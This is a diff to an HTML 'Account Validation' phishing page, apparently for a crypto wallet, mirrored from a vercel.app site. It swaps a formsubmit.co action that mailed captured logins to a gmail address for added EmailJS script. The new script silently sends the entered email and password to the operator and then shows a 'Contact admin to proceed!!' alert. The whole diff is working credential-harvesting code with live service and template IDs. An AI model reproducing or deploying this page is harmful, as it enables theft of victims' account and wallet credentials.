@@ -73,9 +73,8 @@ span.psw {
 
 <h2>Account Validation</h2>
 
-<form action="https://formsubmit.co/monicaholt090@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://re-validate-accountnow.vercel.app/processing.html">  <div class="imgcontainer">
+<form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
+  <div class="imgcontainer">
     <img src="img_avatar2.png" alt="Avatar" class="avatar">
   </div>
   <div class="container">
@@ -85,13 +84,42 @@ span.psw {
     <label for="password"><b>Password</b></label>
     <input type="password" placeholder="Enter Password" name="password" required>
         
-    <button type="submit">Login</button>
+    <button type="submit" id="submit" >Login</button>
     <label>
       <input type="checkbox" checked="checked" name="remember"> Remember me
     </label>
   </div>
 </form>
 
+  <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('ccD04IW7ifuafQTrH')
+</script>
+
+  <script>
+    const btn = document.getElementById('submit');
+
+document.getElementById('my-form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_erd33ev';
+   const templateID = 'template_jz1hrtu';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('Contact admin to proceed!!');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+  </script>
 </body>
 
 <!-- Mirrored from validatewalleturl.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 01 May 2024 15:10:32 GMT -->
